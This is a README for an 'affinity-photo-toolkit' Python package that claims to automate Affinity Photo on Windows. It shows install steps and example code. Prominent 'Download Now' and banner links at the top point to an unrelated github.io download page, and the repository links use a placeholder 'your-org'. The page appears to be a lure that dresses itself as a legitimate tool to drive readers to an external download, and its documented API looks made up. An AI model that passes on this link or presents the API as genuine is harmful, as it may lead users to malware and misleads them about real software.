# affinity-photo-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://syq246.github.io/affinity-hub-vag/)


[![Banner](banner.png)](https://syq246.github.io/affinity-hub-vag/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/project/affinity-photo-toolkit/)
[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://affinity.serif.com/en-us/photo/)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

---

A Python toolkit for automating workflows, processing project files, and extracting metadata from **Affinity Photo on Windows**. Built for photographers, developers, and creative teams who want to integrate Affinity Photo into scripted pipelines without manual intervention.

Whether you are batch-processing `.afphoto` project files, analyzing layer structures, or orchestrating multi-step export workflows on a Windows machine, this toolkit provides a clean, programmatic interface to get the work done.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- **Workflow Automation** — Trigger and sequence Affinity Photo operations on Windows via scripted pipelines, reducing repetitive manual steps
- **Batch File Processing** — Process multiple `.afphoto` files in a directory with a single command, applying consistent export or transform settings
- **Metadata Extraction** — Parse and analyze embedded metadata (EXIF, IPTC, XMP) from Affinity Photo project files and exported images
- **Layer Structure Analysis** — Inspect layer trees, blend modes, and group hierarchies from `.afphoto` documents programmatically
- **Export Orchestration** — Automate multi-format exports (PNG, JPEG, TIFF, PDF) with configurable quality and color-profile settings
- **Windows Process Integration** — Interface with the Affinity Photo Windows application process using `pywin32` for UI-level automation tasks
- **Report Generation** — Produce structured JSON or CSV reports summarizing file properties, color spaces, and document dimensions across large asset libraries
- **Plugin-friendly Architecture** — Extend the toolkit with custom processors that hook into the processing pipeline at any stage

---

## Installation

### From PyPI

```bash
pip install affinity-photo-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/affinity-photo-toolkit.git
cd affinity-photo-toolkit
pip install -e ".[dev]"
```

### Windows-specific Dependency

The Windows process integration module requires `pywin32`. Install it separately if it was not pulled in automatically:

```bash
pip install pywin32
python Scripts/pywin32_postinstall.py -install
```

---

## Quick Start

```python
from affinity_photo_toolkit import AffinityPhotoClient

# Point the client at your Affinity Photo installation on Windows
client = AffinityPhotoClient(
    app_path=r"C:\Program Files\Affinity\Photo 2\Photo.exe"
)

# Open a project file and extract basic document info
doc = client.open_document(r"C:\Projects\landscape_edit.afphoto")
print(doc.info())
# {
#   "name": "landscape_edit",
#   "width_px": 6000,
#   "height_px": 4000,
#   "color_space": "RGB/16",
#   "dpi": 300,
#   "layer_count": 14
# }
```

---

## Usage Examples

### 1. Batch Export a Folder of Project Files

```python
from pathlib import Path
from affinity_photo_toolkit import BatchProcessor, ExportConfig

export_cfg = ExportConfig(
    format="JPEG",
    quality=90,
    color_profile="sRGB",
    output_dir=Path(r"C:\Exports\web_ready")
)

processor = BatchProcessor(
    app_path=r"C:\Program Files\Affinity\Photo 2\Photo.exe",
    export_config=export_cfg
)

results = processor.run(source_dir=Path(r"C:\Projects\client_shoot"))

for result in results:
    status = "OK" if result.success else "FAILED"
    print(f"[{status}] {result.source_file.name} -> {result.output_file}")
```

---

### 2. Extract Metadata from Exported Images

```python
from affinity_photo_toolkit.metadata import MetadataExtractor

extractor = MetadataExtractor()

# Works on files exported from Affinity Photo for Windows
records = extractor.extract_directory(
    path=r"C:\Exports\web_ready",
    fields=["CameraModel", "DateTimeOriginal", "FocalLength", "ISO", "ColorSpace"]
)

for record in records:
    print(record)
# MetadataRecord(file='DSC_0042.jpg', CameraModel='NIKON Z7', ISO=400, ...)
```

---

### 3. Analyze Layer Structure of a Project File

```python
from affinity_photo_toolkit.document import DocumentParser

parser = DocumentParser()
doc = parser.load(r"C:\Projects\composite_work.afphoto")

def print_layer_tree(layers, indent=0):
    for layer in layers:
        prefix = "  " * indent
        print(f"{prefix}- [{layer.type}] {layer.name}  (blend: {layer.blend_mode}, opacity: {layer.opacity}%)")
        if layer.children:
            print_layer_tree(layer.children, indent + 1)

print_layer_tree(doc.layers)
# - [PixelLayer]   Background          (blend: Normal,   opacity: 100%)
# - [GroupLayer]   Retouching          (blend: Normal,   opacity: 100%)
#     - [AdjustmentLayer] Curves       (blend: Normal,   opacity: 80%)
#     - [AdjustmentLayer] HSL          (blend: Normal,   opacity: 100%)
# - [TextLayer]    Watermark           (blend: Multiply, opacity: 60%)
```

---

### 4. Generate a Project Inventory Report

```python
from affinity_photo_toolkit.reporting import ReportBuilder
from pathlib import Path
import json

builder = ReportBuilder()
report = builder.build(
    source_dir=Path(r"C:\Projects"),
    recursive=True,
    include_fields=["file_size_mb", "dimensions", "color_space", "dpi", "layer_count", "modified_date"]
)

# Export to JSON
report.to_json(Path(r"C:\Reports\project_inventory.json"))

# Or inspect inline
print(json.dumps(report.summary(), indent=2))
# {
#   "total_files": 38,
#   "total_size_gb": 2.14,
#   "color_spaces": {"RGB/16": 31, "CMYK/8": 5, "Greyscale/16": 2},
#   "avg_layer_count": 11.3
# }
```

---

### 5. Windows Process Automation via `pywin32`

```python
from affinity_photo_toolkit.win_integration import AffinityProcessManager

manager = AffinityProcessManager(
    app_path=r"C:\Program Files\Affinity\Photo 2\Photo.exe"
)

# Launch the application and wait until the main window is ready
manager.launch(wait_for_ready=True, timeout_seconds=30)

# Check if Affinity Photo is currently running on this Windows machine
if manager.is_running():
    pid = manager.get_pid()
    print(f"Affinity Photo is running with PID {pid}")

# Gracefully close the application after automated work is complete
manager.close(save_prompt_handling="discard")
```

---

## Requirements

| Requirement | Version / Notes |
|---|---|
| **Python** | 3.8 or higher |
| **Operating System** | Windows 10 / Windows 11 |
| **Affinity Photo** | v1.x or v2.x installed locally |
| `pywin32` | ≥ 306 — Windows COM and process integration |
| `Pillow` | ≥ 9.0 — Image reading and pixel-level operations |
| `exifread` | ≥ 3.0 — EXIF/IPTC metadata parsing |
| `lxml` | ≥ 4.9 — XMP and XML structure parsing |
| `click` | ≥ 8.0 — CLI interface |
| `rich` | ≥ 13.0 — Formatted terminal output |
| `pytest` | ≥ 7.0 — Development / testing only |

> **Note:** This toolkit requires a licensed, working installation of **Affinity Photo for Windows**. It does not bundle or distribute the application itself.

---

## Project Structure

```
affinity-photo-toolkit/
├── affinity_photo_toolkit/
│   ├── __init__.py
│   ├── client.py            # AffinityPhotoClient
│   ├── batch.py             # BatchProcessor
│   ├── document.py          # DocumentParser, LayerNode
│   ├── metadata.py          # MetadataExtractor
│   ├── reporting.py         # ReportBuilder
│   ├── win_integration.py   # AffinityProcessManager (Windows)
│   └── export_config.py     # ExportConfig dataclass
├── tests/
│   ├── test_batch.py
│   ├── test_document.py
│   └── test_metadata.py
├── docs/
├── examples/
├── pyproject.toml
├── CONTRIBUTING.md
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository and create a feature branch:
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. **Install development dependencies:**
   ```bash
   pip install -e ".[dev]"
   ```

3. **Run the test suite** before submitting:
   ```bash
   pytest tests/ -v --cov=affinity_photo_toolkit
   ```

4. **Format your code** with `black` and lint with `flake8`:
   ```bash
   black affinity_photo_toolkit/
   flake8 affinity_photo_toolkit/
   ```

5. Open a **Pull Request** with a clear description of what your change does and why.

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for the full code of conduct and contribution guidelines.

---

## Reporting Issues

If you encounter a bug or have a feature request, please [open an issue](https://github.com/your-org/affinity-photo-toolkit/issues) and include:

- Your Windows version (`winver`)
- Your Affinity Photo version
- Your Python version (`python --version`)
- A minimal reproducible example

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for full details.

---

*This toolkit is an independent open-source project and is not affiliated with, endorsed by, or supported by Serif (Europe) Ltd., the developer of Affinity Photo.*